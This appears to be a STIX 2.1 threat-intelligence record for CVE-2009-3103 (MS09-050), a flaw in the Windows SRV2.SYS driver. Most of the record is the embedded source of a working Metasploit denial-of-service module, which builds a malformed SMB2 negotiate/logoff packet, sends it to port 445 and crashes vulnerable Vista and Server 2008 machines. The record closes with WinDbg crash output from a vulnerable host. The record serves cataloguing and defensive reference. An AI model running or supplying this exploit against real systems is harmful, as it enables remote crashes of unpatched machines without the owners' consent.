{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3aab6c5b-fd6e-428e-8ea3-2312364068b4",
    "created": "2024-08-14T16:25:42.236836Z",
    "modified": "2024-08-14T16:25:42.23684Z",
    "name": "Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference",
    "description": " This module triggers a NULL pointer dereference in the SRV2.SYS kernel driver when processing an SMB2 logoff request before a session has been correctly negotiated, resulting in a BSOD. Effecting Vista SP1/SP2 (And possibly Server 2008 SP1/SP2), the flaw was resolved with MS09-050. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff.rb",
            "external_id": "ms09_050_smb2_session_logoff.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3103"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference',\n      'Description'    => %q{\n        This module triggers a NULL pointer dereference in the SRV2.SYS kernel driver when processing\n        an SMB2 logoff request before a session has been correctly negotiated, resulting in a BSOD.\n        Effecting Vista SP1/SP2 (And possibly Server 2008 SP1/SP2), the flaw was resolved with MS09-050.\n      },\n      'Author'         => [ 'sf' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2009-3103'],\n          [ 'OSVDB', '57799' ],\n          [ 'MSB', 'MS09-050' ],\n        ]\n    ))\n\n    register_options( [ Opt::RPORT( 445 ) ])\n  end\n\n  def run\n    print_status( \"Targeting host #{datastore['RHOST']}:#{datastore['RPORT']}...\" )\n    connect\n\n    dialects = [ \"AAAA\" + [ 0xDEADC0DE ].pack( \"V\" ) + [ 0xCAFEF00D ].pack( \"V\" ), \"SMB 2.002\" ]\n\n    data  = dialects.collect { |dialect| \"\\x02\" + dialect + \"\\x00\" }.join( '' )\n    data += \"A\" * 128\n\n    packet = Rex::Proto::SMB::Constants::SMB_NEG_PKT.make_struct\n\n    packet['Payload']['SMB'].v['Command']       = Rex::Proto::SMB::Constants::SMB_COM_NEGOTIATE\n    packet['Payload']['SMB'].v['Flags1']        = 0x18\n    packet['Payload']['SMB'].v['Flags2']        = 0xC853\n    packet['Payload']['SMB'].v['ProcessIDHigh'] = Rex::Proto::SMB::Constants::SMB2_OP_LOGOFF\n    packet['Payload'].v['Payload']              = data\n\n    packet = packet.to_s\n\n    print_status( \"Sending the exploit packet (#{packet.length} bytes)...\" )\n    sock.put( packet )\n\n    response = sock.get_once\n\n    if( not response )\n      print_status( \"No response. The target system has probably crashed.\" )\n    else\n      print_status( \"Response received. The target system is not vulnerable:\\n#{response.inspect}\" )\n    end\n\n    disconnect\n  end\nend\n\n=begin\n\nSome WinDbg output from a vulnerable Vista SP2 machine:\n\nCONTEXT:\neax=0032bfbc ebx=9beafb20 ecx=0000000a edx=00000000 esi=00000000 edi=9be8e690\neip=9935a9d1 esp=98b86cb8 ebp=98b86cc0 iopl=0         nv up ei pl nz na po nc\ncs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010202\nsrv2!RfsTableLookup+0xa:\n9935a9d1 837e4800        cmp     dword ptr [esi+48h],0 ds:0023:00000048=????????\n\nSTACK_TEXT:\n98b86cc0 99359f95 00000000 0032bfbc 9be8e830 srv2!RfsTableLookup+0xa\n98b86cdc 99364328 9be8e690 DEADC0DE CAFEF00D srv2!SrvVerifySessionEx+0xdc\n98b86d00 9935a6cc 9be8e690 00000000 9be8e690 srv2!Smb2ValidateLogoff+0x3c\n98b86d3c 99374a7f 9be8e690 98c1e018 9be8e690 srv2!Smb2ValidateProviderCallback+0x501\n98b86d50 9937319f 9be8e690 00000000 98c4f020 srv2!SrvProcessPacket+0x4b\n98b86d7c 81a0ec42 00000000 b52bf019 00000000 srv2!SrvProcWorkerThread+0x19a\n98b86dc0 81877efe 99373005 98c1e018 00000000 nt!PspSystemThreadStartup+0x9d\n00000000 00000000 00000000 00000000 00000000 nt!KiThreadStartup+0x16\n=end\n"
}